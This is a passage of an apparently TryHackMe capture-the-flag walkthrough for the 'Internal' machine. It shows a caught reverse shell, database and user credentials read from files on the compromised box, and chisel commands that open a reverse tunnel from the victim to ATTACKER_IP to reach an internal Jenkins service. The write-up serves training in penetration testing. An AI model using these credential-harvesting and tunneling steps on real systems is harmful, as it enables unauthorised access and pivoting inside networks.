---
sidebar_position: 2
description: Internal
sidebar_label: Tunneling
keywords: [internal, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, wpscan, privilege escalation, xml-rpc, wordpress, chisel]
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';


# [Internal] Tunneling

<br/>


- **We can catch the Reverse Shell Using `netcat`**

```bash
www-data@internal /$  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br/>

- This `Configuration-File` contains <b style={{ color: 'FireBrick' }}>PHPMyAdmin</b> Credentials: `/etc/phpmyadmin/config-db.php`
- <b style={{ color: 'Chartreuse' }}>phpmyadmin</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>B2Ud4fEOZmVq</b>
- <b style={{ color: 'Red' }}>[NOTE]</b> <b style={{ color: 'FireBrick' }}>PHPMyAdmin</b> is a <span style={{fontWeight: 'Bold'}}>Rabbit Hole.</span>

```php
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

<br/>

- **File: `/opt/wp-save.txt`** 
- **Contains Credentials of the User:** <b style={{ color: 'Chartreuse' }}>aubreanna</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>bubb13guM!@#123</b>

```bash
www-data@internal /$  cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  
Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

<br/>

- **Switching to User:** <b style={{ color: 'Chartreuse' }}>aubreanna</b>
- With further Enumeration we find that <b style={{ color: 'FireBrick' }}>Jenkins</b> is running Locally <b style={{ color: 'SandyBrown' }}>[LOCAL:8080]</b>
- We can use either **`SSH Tunneling`** or **`chisel`** as a TCP/UDP Tunnel.

```bash
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
aubreanna@internal:~$ ls -l
total 12
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

```bash {6}
aubreanna@internal:~$ netstat -netulp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      111        23071      -                   
tcp        0      0 127.0.0.1:35053         0.0.0.0:*               LISTEN      0          23056      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      0          24180      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        18568      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          22230      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          22553      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          22246      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        18567      -                   
udp        0      0 10.10.90.155:68         0.0.0.0:*                           100        18382      - 
```

<br/>


- <a class="button button--outline button--info" href="https://github.com/jpillora/chisel">Chisel GitHub</a>
- Transfer the `chisel` Binary on the Victim Machine.


:::info CHISEL

<Tabs>
  <TabItem value="chisel_one" label="Attacker"> 
    <div style={{color: 'red'}}>

```log
chisel server --reverse --port 8000
```

</div>
  </TabItem>
  <TabItem value="chisel_two" label="Victim">
        <div style={{color: 'red'}}>

```log
chisel client ATTACKER_IP:8000 R:8080:127.0.0.1:8080
```

</div>
  </TabItem>
</Tabs>

:::

---